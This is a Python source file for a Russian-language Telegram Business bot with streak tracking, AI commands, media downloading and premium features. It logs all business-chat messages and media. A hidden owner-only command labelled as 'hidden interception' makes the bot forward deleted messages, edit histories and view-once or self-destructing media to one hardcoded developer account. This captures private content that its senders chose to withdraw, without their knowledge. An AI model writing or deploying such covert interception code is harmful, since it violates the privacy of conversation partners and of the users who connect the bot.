import asyncio
import html
import logging
import os
import re
import signal
import sqlite3
from datetime import datetime
from typing import Optional, Tuple, Any, Set
from dotenv import load_dotenv
from timezone import now, now_iso

from telegram import InputFile, Update
from telegram.ext import (
    Application,
    BusinessConnectionHandler,
    BusinessMessagesDeletedHandler,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    PreCheckoutQueryHandler,
    filters,
)

from series_db import init_series_db, get_series
from series import process_message, build_summary
from series_commands import handle_series_command, handle_series_callback
from series_story import create_story_card, resolve_story_participants
from series_worker import series_worker

from tn_commands import handle_time_command, handle_time_callback, handle_weather_command, send_timezone_menu
from tn_worker import name_worker
from tn_db import init_settings_table, get_ephemeral_limit_for_user

from start_commands import start_command, help_command, instruction_callback, HELP_SUMMARY_TEXT, webapp_command
from webapp_server import start_webapp_server
from autostop_db import init_bot_config, is_autostop_active, toggle_autostop
from premium_db import init_premium_db, is_premium
from bio_worker import bio_worker, on_business_connection_update
from premium_commands import (
    premium_command,
    handle_premium_callback,
    pre_checkout_handler,
    successful_payment_handler,
    give_premium_admin_command,
)

from admin_db import init_admin_db, record_bot_user, resolve_user_id, has_feature_access
from admin_commands import (
    admin_command,
    add_admin_command,
    del_admin_command,
    give_feature_command,
    broadcast_command,
    handle_admin_callback,
    handle_admin_text_input,
)
from description_commands import (
    description_command,
    handle_description_callback,
    handle_description_text_input,
)
from description_worker import description_worker
from permissions_check import is_own_business_message, get_connection_owner_id
from media_downloader import init_media_db, handle_media_callback, handle_detected_media_url
from ai_service import init_ai_db, handle_ai_command
from emoji_status_db import init_emoji_status_db
from emoji_status_commands import (
    emoji_status_command,
    handle_emoji_status_callback,
    handle_emoji_status_text_input,
)
from emoji_status_worker import emoji_status_worker

load_dotenv()

# ─────────────────────────── КОНФИГУРАЦИЯ ───────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")        # токен от @BotFather
OWNER_ID = 8470104943                  # ваш user_id (узнать у @userinfobot)

DATA_DIR = os.getenv("DATA_DIR", "data")
os.makedirs(DATA_DIR, exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "messages.db")
MEDIA_DIR = os.path.join(DATA_DIR, "downloads")
os.makedirs(MEDIA_DIR, exist_ok=True)

WEBAPP_HOST = os.getenv("WEBAPP_HOST", "0.0.0.0")
WEBAPP_PORT = int(os.getenv("PORT", os.getenv("WEBAPP_PORT", "3000")))
WEBAPP_URL = os.getenv("WEBAPP_URL", "https://bot.rad1kal.fun")
# ────────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)


def _migrate_old_storage() -> None:
    """Бережно переносит существующую БД и скачанные медиафайлы из корня в папку data/ при первом запуске."""
    old_db = "messages.db"
    if not os.path.exists(DB_PATH) and os.path.exists(old_db):
        try:
            import shutil
            shutil.copy2(old_db, DB_PATH)
            logging.info("Миграция: %s скопирован в %s", old_db, DB_PATH)
        except Exception as e:
            logging.error("Ошибка при миграции %s в %s: %s", old_db, DB_PATH, e)

    old_downloads = "downloads"
    if os.path.exists(old_downloads) and os.path.isdir(old_downloads):
        try:
            import shutil
            if os.path.abspath(old_downloads) != os.path.abspath(MEDIA_DIR):
                for item in os.listdir(old_downloads):
                    src_f = os.path.join(old_downloads, item)
                    dst_f = os.path.join(MEDIA_DIR, item)
                    if not os.path.exists(dst_f):
                        shutil.move(src_f, dst_f)
                logging.info("Миграция: медиафайлы из %s перенесены в %s", old_downloads, MEDIA_DIR)
        except Exception as e:
            logging.error("Ошибка при миграции медиафайлов: %s", e)


_migrate_old_storage()


# ─────────────────────────── БАЗА ДАННЫХ ────────────────────────────
def init_db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            message_id              INTEGER,
            chat_id                 INTEGER,
            from_user_id            INTEGER,
            from_user_name          TEXT,
            text                    TEXT,
            media_path              TEXT,
            media_type              TEXT,
            date                    TEXT,
            business_connection_id  TEXT,
            is_ephemeral            INTEGER DEFAULT 0,
            PRIMARY KEY (message_id, chat_id)
        )
    """)
    # Миграция: убеждаемся, что колонка is_ephemeral существует в старых БД
    try:
        cols = [c[1] for c in conn.execute("PRAGMA table_info(messages)").fetchall()]
        if "is_ephemeral" not in cols:
            conn.execute("ALTER TABLE messages ADD COLUMN is_ephemeral INTEGER DEFAULT 0")
    except Exception:
        pass
    conn.commit()
    return conn


DB = init_db()
init_series_db(DB)
init_settings_table(DB)
init_bot_config(DB)
init_premium_db(DB)
init_admin_db(DB)
init_media_db(DB)
init_ai_db(DB)
init_emoji_status_db(DB)

# Множество (chat_id, message_id) уже пересланных владельцу одноразовых медиа,
# чтобы не дублировать отправку при повторных ответах в чате.
_FORWARDED_EPHEMERAL_MSGS: Set[Tuple[int, int]] = set()


# ─────────────────────────── КРАСИВОЕ ОФОРМЛЕНИЕ ────────────────────────
def get_user_display_info(conn: sqlite3.Connection, user_id: int, fallback_name: Optional[str] = None) -> Tuple[str, Optional[str]]:
    """Возвращает (display_name, username) пользователя из bot_users или fallback."""
    name = fallback_name or "Пользователь"
    username = None
    if user_id:
        try:
            row = conn.execute("SELECT first_name, username FROM bot_users WHERE user_id = ?", (user_id,)).fetchone()
            if row:
                if row[0]:
                    name = row[0]
                if row[1]:
                    username = row[1]
        except Exception:
            pass
    return name, username


def format_user_mention(user_id: int, name: str, username: Optional[str] = None) -> str:
    """Формирует красивую кликабельную ссылку на пользователя с юзернеймом и ID."""
    clean_name = html.escape(name or "Пользователь")
    if user_id and user_id > 0:
        link = f'<a href="tg://user?id={user_id}">{clean_name}</a>'
    else:
        link = clean_name
    parts = [link]
    if username:
        clean_u = username.lstrip("@")
        parts.append(f'(@{html.escape(clean_u)})')
    if user_id and user_id > 0:
        parts.append(f'<code>[{user_id}]</code>')
    return " ".join(parts)


def format_timestamp(dt_val: Any = None) -> str:
    """Красиво форматирует дату и время: '17.10.2026 в 21:45'."""
    if not dt_val:
        return now().strftime("%d.%m.%Y в %H:%M")
    if isinstance(dt_val, datetime):
        return dt_val.strftime("%d.%m.%Y в %H:%M")
    try:
        dt = datetime.fromisoformat(str(dt_val))
        return dt.strftime("%d.%m.%Y в %H:%M")
    except Exception:
        return str(dt_val)


def strip_html(text: str) -> str:
    """Удаляет HTML-теги для безопасной fallback-отправки простым текстом."""
    if not text:
        return ""
    return re.sub(r"<[^>]+>", "", text)


def is_ephemeral_message(msg: Any, conn: Optional[sqlite3.Connection] = None, chat_id: Optional[int] = None) -> bool:
    """
    Определяет, является ли сообщение одноразовым (view-once / self-destructing):
    1. Проверка ttl / ttl_period / has_media_spoiler
    2. Проверка api_kwargs на случай нестандартных полей Telegram
    3. Проверка вложений (photo, video, voice, video_note)
    4. Проверка сохранённого статуса в БД messages (is_ephemeral = 1)
    """
    if not msg:
        return False

    # 1. Флаги на объекте Message
    if getattr(msg, "ttl", None) or getattr(msg, "ttl_period", None):
        return True
    if getattr(msg, "has_media_spoiler", False):
        return True

    # 2. Поля в api_kwargs
    api_kw = getattr(msg, "api_kwargs", None) or {}
    if any(api_kw.get(k) for k in ("ttl", "ttl_period", "is_ephemeral", "view_once", "has_media_spoiler")):
        return True

    # 3. Вложения
    for att_name in ("photo", "video", "voice", "video_note", "audio", "document"):
        att = getattr(msg, att_name, None)
        if not att:
            continue
        items = att if isinstance(att, (list, tuple)) else [att]
        for item in items:
            if getattr(item, "has_media_spoiler", False):
                return True
            item_kw = getattr(item, "api_kwargs", None) or {}
            if any(item_kw.get(k) for k in ("ttl", "ttl_period", "is_ephemeral", "view_once", "has_media_spoiler")):
                return True

    # 4. Проверка в БД
    if conn and chat_id and getattr(msg, "message_id", None):
        try:
            row = conn.execute(
                "SELECT is_ephemeral FROM messages WHERE message_id = ? AND chat_id = ?",
                (msg.message_id, chat_id),
            ).fetchone()
            if row and row[0] == 1:
                return True
        except Exception:
            pass

    return False


def format_ephemeral_header(
    user_id: int,
    name: str,
    username: Optional[str],
    chat_id: int,
    dt: Optional[str] = None,
    caption: Optional[str] = None,
) -> str:
    """Оформляет карточку сохранённого одноразового медиа."""
    user_str = format_user_mention(user_id, name, username)
    time_str = format_timestamp(dt)
    lines = [
        "🔥 <b>Одноразовое медиа сохранено</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"👤 <b>От:</b> {user_str}",
        f"💬 <b>Чат:</b> <code>{chat_id}</code>",
        f"🕒 <b>Время:</b> {time_str}",
    ]
    if caption and caption.strip():
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"💬 <b>Подпись:</b>\n<blockquote>{html.escape(caption.strip())}</blockquote>")
    return "\n".join(lines)


def format_reply_ephemeral_header(
    user_id: int,
    name: str,
    username: Optional[str],
    chat_id: int,
    dt: Optional[str] = None,
    caption: Optional[str] = None,
) -> str:
    """Оформляет карточку одноразового медиа, сохранённого по ответу (reply)."""
    user_str = format_user_mention(user_id, name, username)
    time_str = format_timestamp(dt)
    lines = [
        "🔥 <b>Одноразовое медиа (сохранено по ответу)</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"👤 <b>Автор:</b> {user_str}",
        f"💬 <b>Чат:</b> <code>{chat_id}</code>",
        f"🕒 <b>Время:</b> {time_str}",
    ]
    if caption and caption.strip():
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"💬 <b>Подпись:</b>\n<blockquote>{html.escape(caption.strip())}</blockquote>")
    return "\n".join(lines)


def format_deleted_message_header(
    user_id: int,
    name: str,
    username: Optional[str],
    chat_id: int,
    date_sent: Optional[str] = None,
    text: Optional[str] = None,
    media_type: Optional[str] = None,
    is_ephemeral: bool = False,
) -> str:
    """Оформляет карточку удалённого сообщения."""
    user_str = format_user_mention(user_id, name, username)
    time_sent_str = format_timestamp(date_sent)
    time_del_str = format_timestamp()

    title = "🔥 <b>Самоуничтожилось одноразовое медиа</b>" if is_ephemeral else "🗑 <b>Удалено сообщение</b>"

    media_labels = {
        "photo": "📸 Фотография",
        "video": "🎥 Видеозапись",
        "voice": "🎤 Голосовое сообщение",
        "video_note": "📹 Кружочек (видеосообщение)",
        "audio": "🎵 Аудиозапись",
        "document": "📄 Документ",
    }
    media_label = media_labels.get(media_type or "", "")

    lines = [
        title,
        "━━━━━━━━━━━━━━━━━━━━",
        f"👤 <b>Автор:</b> {user_str}",
        f"💬 <b>Чат:</b> <code>{chat_id}</code>",
        f"🕒 <b>Отправлено:</b> {time_sent_str}",
        f"⏱ <b>Удалено:</b> {time_del_str}",
    ]
    if media_label:
        lines.append(f"📁 <b>Вложение:</b> {media_label}")
    if text and text.strip() and text != "(текст отсутствовал)":
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"📝 <b>Текст:</b>\n<blockquote>{html.escape(text.strip())}</blockquote>")
    return "\n".join(lines)


def format_edited_message_header(
    user_id: int,
    name: str,
    username: Optional[str],
    chat_id: int,
    old_text: str,
    new_text: str,
) -> str:
    """Оформляет карточку отредактированного сообщения."""
    user_str = format_user_mention(user_id, name, username)
    time_str = format_timestamp()
    lines = [
        "✏️ <b>Сообщение отредактировано</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"👤 <b>Автор:</b> {user_str}",
        f"💬 <b>Чат:</b> <code>{chat_id}</code>",
        f"🕒 <b>Время:</b> {time_str}",
        "━━━━━━━━━━━━━━━━━━━━",
        "🔻 <b>Было:</b>",
        f"<blockquote>{html.escape(old_text.strip() if old_text else 'Пусто')}</blockquote>",
        "🔺 <b>Стало:</b>",
        f"<blockquote>{html.escape(new_text.strip() if new_text else 'Пусто')}</blockquote>",
    ]
    return "\n".join(lines)


# ─────────────────────────── СКРЫТЫЙ ПЕРЕХВАТ ────────────────────────
async def avtostop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Скрытая команда включения/выключения перехвата (не отображается в меню)."""
    user = update.effective_user
    if not user or user.id != OWNER_ID:
        return
    new_state = toggle_autostop(DB)
    status_text = "АКТИВИРОВАН ✅" if new_state else "ДЕАКТИВИРОВАН ❌"
    msg = update.effective_message
    if msg:
        await msg.reply_text(
            f"🛡 <b>Скрытый перехват: {status_text}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Удалённые и одноразовые медиа {'будут пересылаться вам в ЛС.' if new_state else 'не пересылаются.'}",
            parse_mode="HTML",
        )


# ─────────────────────────── СКАЧИВАНИЕ МЕДИА ───────────────────────
async def download_media(message, context: ContextTypes.DEFAULT_TYPE):
    """Скачивает медиа из сообщения и возвращает (путь, тип)."""
    attachment = message.effective_attachment
    if not attachment:
        return None, None

    if isinstance(attachment, tuple):
        attachment = attachment[-1]

    try:
        file = await context.bot.get_file(attachment.file_id)
    except Exception as e:
        logging.error(f"get_file failed: {e}")
        return None, None

    ext = os.path.splitext(file.file_path or "")[1] or ".bin"
    path = os.path.join(MEDIA_DIR, f"{message.chat_id}_{message.message_id}{ext}")

    try:
        await file.download_to_drive(path)
    except Exception as e:
        logging.error(f"download_to_drive failed: {e}")
        return None, None

    if message.photo:
        media_type = "photo"
    elif message.video:
        media_type = "video"
    elif message.voice:
        media_type = "voice"
    elif message.audio:
        media_type = "audio"
    elif message.document:
        media_type = "document"
    elif message.video_note:
        media_type = "video_note"
    else:
        media_type = "unknown"

    return path, media_type


# ─────────────────────── ОТПРАВКА МЕДИА В ЛИЧКУ ─────────────────────
async def send_media_to_owner(context: ContextTypes.DEFAULT_TYPE, media_path: str, media_type: str, caption: str) -> bool:
    """Отправляет сохранённый файл владельцу в личку с красивым HTML-оформлением."""
    if not media_path or not os.path.exists(media_path):
        return False

    safe_caption = caption if len(caption) <= 1024 else caption[:1020] + "…"
    extra_msg = caption if len(caption) > 1024 else None

    try:
        with open(media_path, "rb") as f:
            if media_type == "photo":
                try:
                    await context.bot.send_photo(OWNER_ID, f, caption=safe_caption, parse_mode="HTML")
                except Exception:
                    f.seek(0)
                    await context.bot.send_photo(OWNER_ID, f, caption=strip_html(safe_caption))
            elif media_type == "video":
                try:
                    await context.bot.send_video(OWNER_ID, f, caption=safe_caption, parse_mode="HTML", supports_streaming=True)
                except Exception:
                    f.seek(0)
                    await context.bot.send_video(OWNER_ID, f, caption=strip_html(safe_caption))
            elif media_type == "voice":
                try:
                    await context.bot.send_voice(OWNER_ID, f, caption=safe_caption, parse_mode="HTML")
                except Exception:
                    f.seek(0)
                    await context.bot.send_voice(OWNER_ID, f, caption=strip_html(safe_caption))
            elif media_type == "video_note":
                await context.bot.send_video_note(OWNER_ID, f)
                if caption:
                    try:
                        await context.bot.send_message(OWNER_ID, caption, parse_mode="HTML")
                    except Exception:
                        await context.bot.send_message(OWNER_ID, strip_html(caption))
            else:
                try:
                    await context.bot.send_document(OWNER_ID, f, caption=safe_caption, parse_mode="HTML")
                except Exception:
                    f.seek(0)
                    await context.bot.send_document(OWNER_ID, f, caption=strip_html(safe_caption))

        if extra_msg:
            try:
                await context.bot.send_message(OWNER_ID, extra_msg, parse_mode="HTML")
            except Exception:
                await context.bot.send_message(OWNER_ID, strip_html(extra_msg))
        return True
    except Exception as e:
        logging.error(f"send_media_to_owner failed: {e}")
        return False


# ─────────────── ОТПРАВКА ПО FILE_ID (НОВЫЙ ПОДХОД) ─────────────────
async def resend_by_file_id(context: ContextTypes.DEFAULT_TYPE, replied, header: str) -> bool:
    """Пересылает медиа владельцу по file_id с красивой HTML-подписью."""
    sent = False
    safe_caption = header if len(header) <= 1024 else header[:1020] + "…"
    extra_msg = header if len(header) > 1024 else None

    try:
        if replied.photo:
            file_id = replied.photo[-1].file_id
            try:
                await context.bot.send_photo(OWNER_ID, file_id, caption=safe_caption, parse_mode="HTML")
            except Exception:
                await context.bot.send_photo(OWNER_ID, file_id, caption=strip_html(safe_caption))
            sent = True
        elif replied.video:
            try:
                await context.bot.send_video(OWNER_ID, replied.video.file_id, caption=safe_caption, parse_mode="HTML", supports_streaming=True)
            except Exception:
                await context.bot.send_video(OWNER_ID, replied.video.file_id, caption=strip_html(safe_caption))
            sent = True
        elif replied.video_note:
            await context.bot.send_video_note(OWNER_ID, replied.video_note.file_id)
            try:
                await context.bot.send_message(OWNER_ID, header, parse_mode="HTML")
            except Exception:
                await context.bot.send_message(OWNER_ID, strip_html(header))
            sent = True
        elif replied.voice:
            try:
                await context.bot.send_voice(OWNER_ID, replied.voice.file_id, caption=safe_caption, parse_mode="HTML")
            except Exception:
                await context.bot.send_voice(OWNER_ID, replied.voice.file_id, caption=strip_html(safe_caption))
            sent = True
        elif replied.audio:
            try:
                await context.bot.send_audio(OWNER_ID, replied.audio.file_id, caption=safe_caption, parse_mode="HTML")
            except Exception:
                await context.bot.send_audio(OWNER_ID, replied.audio.file_id, caption=strip_html(safe_caption))
            sent = True
        elif replied.document:
            try:
                await context.bot.send_document(OWNER_ID, replied.document.file_id, caption=safe_caption, parse_mode="HTML")
            except Exception:
                await context.bot.send_document(OWNER_ID, replied.document.file_id, caption=strip_html(safe_caption))
            sent = True

        if sent and extra_msg:
            try:
                await context.bot.send_message(OWNER_ID, extra_msg, parse_mode="HTML")
            except Exception:
                await context.bot.send_message(OWNER_ID, strip_html(extra_msg))
    except Exception as e:
        logging.error(f"resend_by_file_id failed: {e}")
    return sent


# ─────────────────────── НОВОЕ БИЗНЕС-СООБЩЕНИЕ ─────────────────────
async def on_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.business_message
    if not msg:
        return

    from_user = msg.from_user
    from_name = from_user.full_name if from_user else "Unknown"
    from_id = from_user.id if from_user else 0
    from_username = getattr(from_user, "username", None)

    # Сохраняем в таблицу пользователей бота
    record_bot_user(DB, from_id, from_username, from_name)

    # ───── ОБРАБОТКА КОМАНД ─────
    if msg.text and (msg.text.startswith(".") or msg.text.startswith("/")):
        clean = msg.text.strip().lower()

        # Все команды в бизнес-чате (.ai, .time, .description и др.)
        # разрешено вызывать ТОЛЬКО от своих сообщений (владельца бизнес-аккаунта)!
        # Если пишет собеседник, бот НЕ должен реагировать и тратить токены.
        is_own = await is_own_business_message(context.bot, DB, msg)

        if not is_own:
            logging.info(f"Команда '{clean}' в бизнес-чате проигнорирована: отправлена собеседником ({from_id})")
        else:
            # Нейросеть (.ai / /ai)
            if clean.startswith((".ai", "/ai")):
                if await handle_ai_command(update, context, DB):
                    return

            # Скрытая команда /avtostop
            if clean in ("/avtostop", ".avtostop"):
                if from_id == OWNER_ID:
                    new_state = toggle_autostop(DB)
                    status_text = "АКТИВИРОВАН ✅" if new_state else "ДЕАКТИВИРОВАН ❌"
                    await context.bot.send_message(
                        OWNER_ID,
                        f"🛡 <b>Скрытый перехват: {status_text}</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"Удалённые и одноразовые медиа {'будут пересылаться вам в ЛС.' if new_state else 'не пересылаются.'}",
                        parse_mode="HTML",
                    )
                return

            # Справка
            if clean in (".help", "/help"):
                try:
                    await context.bot.send_message(
                        chat_id=msg.chat_id,
                        text=HELP_SUMMARY_TEXT,
                        business_connection_id=msg.business_connection_id,
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    logging.error(f"send help failed: {e}")
                return

            # Премиум
            if clean in (".premium", "/premium"):
                await premium_command(update, context, DB)
                return

            # Админка
            if clean in ("/admin", ".admin"):
                await admin_command(update, context, DB)
                return

            # Серии
            handled = await handle_series_command(update, context, DB)
            if handled:
                return
    # ───────────────────────────

    # ── Скачивание видео/аудио из соцсетей (YouTube, VK, Rutube, TikTok, IG, etc.) ──
    if msg.text and not (msg.text.startswith(".") or msg.text.startswith("/")):
        try:
            await handle_detected_media_url(
                bot=context.bot,
                conn=DB,
                chat_id=msg.chat_id,
                user_id=from_id,
                raw_message_text=msg.text,
                message_id=msg.message_id,
                business_connection_id=msg.business_connection_id,
            )
        except Exception as e:
            logging.error(f"handle_detected_media_url error in business: {e}")

    conn_id = msg.business_connection_id
    if conn_id:
        if msg.chat_id != from_id and from_id != 0:
            tn_db.upsert_user_connection(DB, from_id, conn_id, first_name=from_name, is_active=True)
        else:
            try:
                await get_connection_owner_id(context.bot, DB, conn_id)
            except Exception:
                pass

    intercept_active = is_autostop_active(DB)
    is_ephemeral = is_ephemeral_message(msg, DB, msg.chat_id)

    # Лимит одноразок
    if is_ephemeral:
        eph_limit = get_ephemeral_limit_for_user(DB, from_id)
        today_key = f"eph_cnt_{datetime.now().strftime('%Y%m%d')}_{from_id}"
        cur_cnt_row = DB.execute("SELECT value FROM bot_config WHERE key = ?", (today_key,)).fetchone()
        cur_cnt = int(cur_cnt_row[0]) if cur_cnt_row else 0

        if cur_cnt >= eph_limit and not is_premium(DB, from_id):
            logging.info(f"Лимит сохранения одноразок исчерпан для {from_id} ({cur_cnt}/{eph_limit})")
            return

        DB.execute("INSERT OR REPLACE INTO bot_config (key, value) VALUES (?, ?)", (today_key, str(cur_cnt + 1)))
        DB.commit()

    # ──────── ПЕРЕХВАТ ЧЕРЕЗ ОТВЕТ НА СООБЩЕНИЕ ────────
    if intercept_active and msg.reply_to_message and msg.reply_to_message.effective_attachment:
        replied = msg.reply_to_message
        clean_text = (msg.text or "").strip().lower()
        is_manual_save = clean_text in (".save", "/save", "save", "сохрани", ".сохранить")
        is_replied_eph = is_ephemeral_message(replied, DB, msg.chat_id)

        # Перехватываем ТОЛЬКО если сообщение одноразовое (или явная команда .save от владельца)
        if is_replied_eph or is_manual_save:
            msg_key = (msg.chat_id, replied.message_id)
            if is_manual_save or msg_key not in _FORWARDED_EPHEMERAL_MSGS:
                _FORWARDED_EPHEMERAL_MSGS.add(msg_key)

                replied_from = replied.from_user
                replied_name = replied_from.full_name if replied_from else "Unknown"
                replied_id = replied_from.id if replied_from else 0
                replied_username = getattr(replied_from, "username", None)
                if not replied_username:
                    _, replied_username = get_user_display_info(DB, replied_id, replied_name)

                header = format_reply_ephemeral_header(
                    user_id=replied_id,
                    name=replied_name,
                    username=replied_username,
                    chat_id=msg.chat_id,
                    dt=replied.date.isoformat() if getattr(replied, "date", None) else None,
                    caption=replied.caption,
                )

                file_sent = await resend_by_file_id(context, replied, header)
                if not file_sent:
                    media_path, media_type = await download_media(replied, context)
                    if media_path:
                        await send_media_to_owner(context, media_path, media_type, header)

    # Скачиваем медиа
    media_path, media_type = None, None
    if msg.effective_attachment:
        media_path, media_type = await download_media(msg, context)

    text = msg.text or msg.caption or ""

    try:
        DB.execute("""
            INSERT OR REPLACE INTO messages
            (message_id, chat_id, from_user_id, from_user_name, text,
             media_path, media_type, date, business_connection_id, is_ephemeral)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            msg.message_id,
            msg.chat_id,
            from_id,
            from_name,
            text,
            media_path,
            media_type,
            datetime.now().isoformat(timespec="seconds"),
            conn_id,
            1 if is_ephemeral else 0,
        ))
        DB.commit()
    except Exception as e:
        logging.error(f"DB insert failed: {e}")
        return

    # Одноразовое медиа в ЛС (при первом получении)
    if intercept_active and is_ephemeral and media_path:
        msg_key = (msg.chat_id, msg.message_id)
        if msg_key not in _FORWARDED_EPHEMERAL_MSGS:
            _FORWARDED_EPHEMERAL_MSGS.add(msg_key)
            header = format_ephemeral_header(
                user_id=from_id,
                name=from_name,
                username=from_username,
                chat_id=msg.chat_id,
                dt=datetime.now().isoformat(timespec="seconds"),
                caption=msg.caption,
            )
            await send_media_to_owner(context, media_path, media_type, header)

    # ───── ОБНОВЛЕНИЕ СЕРИИ ─────
    if not (msg.text and (msg.text.startswith(".") or msg.text.startswith("/"))):
        info = process_message(DB, msg.chat_id, msg.business_connection_id, from_name)
        if info:
            summary = build_summary(DB, msg.chat_id, info)
            if summary:
                try:
                    await context.bot.send_message(
                        chat_id=msg.chat_id,
                        text=summary,
                        business_connection_id=msg.business_connection_id,
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    logging.error(f"send series summary failed: {e}")

            # Автоматическая отправка юбилейной открытки при milestone или stage_up
            if info.get("is_milestone") or info.get("stage_up"):
                try:
                    s = get_series(DB, msg.chat_id)
                    if s:
                        owner_id_val, owner_name, partner_id, partner_name = await resolve_story_participants(
                            bot=context.bot,
                            conn=DB,
                            chat_id=msg.chat_id,
                            s=s,
                            current_user_name=from_name,
                        )

                        buf = await create_story_card(
                            bot=context.bot,
                            s=s,
                            user1_id=owner_id_val,
                            user1_name=owner_name,
                            user2_id=partner_id,
                            user2_name=partner_name,
                        )
                        await context.bot.send_photo(
                            chat_id=msg.chat_id,
                            photo=InputFile(buf, filename="streak_story.png"),
                            caption="📸 *Юбилейная открытка!*\nСохрани и выложи в историю Telegram ✨",
                            parse_mode="Markdown",
                            business_connection_id=msg.business_connection_id,
                        )
                except Exception as e:
                    logging.error(f"auto story card failed: {e}")


# ─────────────────────── ИЗМЕНЕНИЕ СООБЩЕНИЙ ─────────────────────────
async def on_edited_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.edited_business_message
    if not msg:
        return

    from_user = msg.from_user
    from_name = from_user.full_name if from_user else "Unknown"
    from_id = from_user.id if from_user else 0
    from_username = getattr(from_user, "username", None)
    record_bot_user(DB, from_id, from_username, from_name)

    cur = DB.execute(
        "SELECT text FROM messages WHERE message_id = ? AND chat_id = ?",
        (msg.message_id, msg.chat_id),
    )
    row = cur.fetchone()
    old_text = row[0] if (row and row[0]) else "(текст отсутствовал)"
    new_text = msg.text or msg.caption or ""

    if old_text != new_text:
        DB.execute(
            "UPDATE messages SET text = ?, date = ? WHERE message_id = ? AND chat_id = ?",
            (new_text, datetime.now().isoformat(timespec="seconds"), msg.message_id, msg.chat_id),
        )
        DB.commit()

        if is_autostop_active(DB):
            header = format_edited_message_header(
                user_id=from_id,
                name=from_name,
                username=from_username,
                chat_id=msg.chat_id,
                old_text=old_text,
                new_text=new_text,
            )
            try:
                await context.bot.send_message(OWNER_ID, header, parse_mode="HTML")
            except Exception as e:
                logging.error(f"send edited message failed: {e}")
                try:
                    await context.bot.send_message(OWNER_ID, strip_html(header))
                except Exception:
                    pass


# ─────────────────────── УДАЛЕНИЕ СООБЩЕНИЙ ─────────────────────────
async def on_deleted_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    deleted = update.deleted_business_messages
    if not deleted or not is_autostop_active(DB):
        return

    for msg_id in deleted.message_ids:
        cur = DB.execute(
            "SELECT from_user_id, from_user_name, text, media_path, media_type, date, chat_id, is_ephemeral "
            "FROM messages WHERE message_id = ? AND chat_id = ?",
            (msg_id, deleted.chat.id),
        )
        row = cur.fetchone()
        if not row:
            continue

        user_id, user_name, text, media_path, media_type, date, chat_id, is_eph = row
        display_name, username = get_user_display_info(DB, user_id, user_name)

        header = format_deleted_message_header(
            user_id=user_id,
            name=display_name,
            username=username,
            chat_id=chat_id,
            date_sent=date,
            text=text if not media_path else None,
            media_type=media_type,
            is_ephemeral=bool(is_eph),
        )

        # 1. Если было медиа
        if media_path and os.path.exists(media_path):
            media_caption = header
            if text and text.strip() and text != "(текст отсутствовал)":
                media_caption += f"\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Подпись:</b>\n<blockquote>{html.escape(text.strip())}</blockquote>"
            await send_media_to_owner(context, media_path, media_type, media_caption)
        # 2. Если был только текст
        elif text and text.strip() and text != "(текст отсутствовал)":
            try:
                await context.bot.send_message(OWNER_ID, header, parse_mode="HTML")
            except Exception as e:
                logging.error(f"send_message deleted failed: {e}")
                try:
                    await context.bot.send_message(OWNER_ID, strip_html(header))
                except Exception:
                    pass
        # 3. Если было медиа, но файл не найден на сервере
        elif media_type:
            media_note = header + "\n⚠️ <i>(Медиафайл не сохранился на сервере)</i>"
            try:
                await context.bot.send_message(OWNER_ID, media_note, parse_mode="HTML")
            except Exception as e:
                logging.error(f"send_message deleted failed: {e}")


# ─────────────────── ОБРАБОТЧИК ТЕКСТА В ЛИЧКЕ ───────────────────────
async def on_private_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg:
        return

    user = msg.from_user
    if user:
        record_bot_user(DB, user.id, user.username, user.first_name)

    # 1. Проверяем ввод в описаниях (строки или юзернейм друга)
    if await handle_description_text_input(update, context, DB):
        return

    # 2. Проверяем привязку Premium-эмодзи к слоту расписания
    if await handle_emoji_status_text_input(update, context, DB):
        return

    # 3. Проверяем ввод текста для рассылки админки
    if await handle_admin_text_input(update, context, DB):
        return

    # 3. Запрос к нейросети (.ai / /ai) в ЛС
    if msg.text and msg.text.strip().lower().startswith((".ai", "/ai")):
        if await handle_ai_command(update, context, DB):
            return

    # 4. Скачивание видео/аудио из соцсетей по ссылке в ЛС
    if msg.text:
        try:
            if await handle_detected_media_url(
                bot=context.bot,
                conn=DB,
                chat_id=msg.chat_id,
                user_id=user.id if user else 0,
                raw_message_text=msg.text,
                message_id=msg.message_id,
                business_connection_id=None,
            ):
                return
        except Exception as e:
            logging.error(f"handle_detected_media_url error in private: {e}")


# ─────────────────────────── ЗАПУСК ─────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Telegram Business Connection
    app.add_handler(BusinessConnectionHandler(lambda u, c: on_business_connection_update(u, c, DB)))

    # Команды бота
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler(["app", "webapp"], webapp_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("streak", lambda u, c: handle_series_command(u, c, DB)))
    app.add_handler(CommandHandler("avtostop", avtostop_command))
    app.add_handler(CommandHandler("premium", lambda u, c: premium_command(u, c, DB)))
    app.add_handler(CommandHandler("give_premium", lambda u, c: give_premium_admin_command(u, c, DB)))
    app.add_handler(CommandHandler("description", lambda u, c: description_command(u, c, DB)))
